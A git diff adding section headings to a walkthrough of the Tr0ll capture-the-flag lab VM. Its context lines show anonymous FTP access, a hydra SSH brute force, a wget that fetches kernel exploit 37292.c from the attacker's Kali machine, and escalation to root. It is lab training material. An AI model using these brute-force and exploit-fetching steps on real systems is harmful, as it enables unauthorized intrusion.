@@ -23,7 +23,9 @@
 
 * The defaults of both VM's should get your wheels spinning, at least enough in terms of network connectivity by bridging the network of your host where the hypervisor resides
 
-# Reconnaisance:
+# Methodologies and Attack Vectors
+
+## Reconnaisance: (Information Gathering/Recon from Network Scanning)
 
 * Identify the IPv4 address of your newly provisioned Tr0ll VM using NMAP network range discovery in a ping sweep fashion:
   * Hint, you can also use your hypervisor advanced network settings to see the underlying MAC address, or generate a new one if you are really stuck
@@ -61,6 +63,8 @@ $ sudo netdiscover -i eth0 -r  <ipv4network/cidr>
 
 ![Screenshot 2023-02-03 at 13 20 33](https://user-images.githubusercontent.com/104169244/216751592-d68570ab-3d29-4f30-87ff-711e4b52f2ec.png)
 
+## Anonymous FTP Login - Unauthorized Access
+
 * Exploit the FTP Anonymous Login vulnerability:
 
 ```
@@ -87,6 +91,8 @@ $ ftp <remoteipaddr>
 ![Screenshot 2023-02-03 at 13 56 53](https://user-images.githubusercontent.com/104169244/216752256-fcdecbeb-1560-4333-8c72-549d04490dea.png)
 
 ![Screenshot 2023-02-03 at 13 56 11](https://user-images.githubusercontent.com/104169244/216751893-f5884889-2f57-495e-b8a3-e1f4baedb450.png)
+
+## Abuse of the Web Application - Sensitive Information Disclosure
 
 * From analysis of the former methodology and testing, I was able to pivot from the FTP anonymous login vulnerability and locate the tr0ll directory in the web application:
 
@@ -116,6 +122,8 @@ $ strings /home/kali/Downloads/<tr0llfile>
 # "Find address 0xREDACTED to proceed"
 ```
 
+## Brute Force Attack - Unauthorized Access
+
 * This find gives us the correct directory and hidden files (of which one is another tr0ll)
   * From analysis of the former methodology and testing, I was able to pivot from the abuse of the web application and hidden sensitive files to perform a brute force attack using one of the useful files containing usernames and|or passwords.
   * We know SSH is open from our initial recon and network scanning using `nmap` service enumeration
@@ -136,6 +144,8 @@ $ hydra -L /home/kali/Downloads/usernames.txt -P /home/kali/Downloads/pass.txt <
 ```
 $ ssh <username>@<remoteipaddr>:22
 ```
+
+## Privilege Escalation
 
 * From analysis of the former methodology and testing, we have now successfully authenticate with valid credentials via SSH to the server, but then identified it did not have sudo permissions and came across another tripwire tr0ll:
 
@@ -213,6 +223,8 @@ $ wget http://<kali-vm-ipaddr>:<http-port>/Desktop/37292.c
 
 ![Screenshot 2023-02-03 at 15 21 23](https://user-images.githubusercontent.com/104169244/216752039-9b93fed6-8397-4d19-bfa0-6405a3066d9c.png)
 
+## Privilege Escalation - Gaining Root Access
+
 * From analysis of the former methodology and testing, we can then gain Root access to the system from the prior privilege escalation vulnerability:
 
 ```
@@ -233,6 +245,8 @@ root
 ```
 
 ![Screenshot 2023-02-03 at 15 26 08](https://user-images.githubusercontent.com/104169244/216752067-22858742-dfa2-4a32-a904-1ba72c52b884.png)
+
+## Capture the Flag - Information Gathering
 
 * From analysis of the former methodology and testing, I was able to pivot to the `/root/` directory which contained the CTF flag:
 
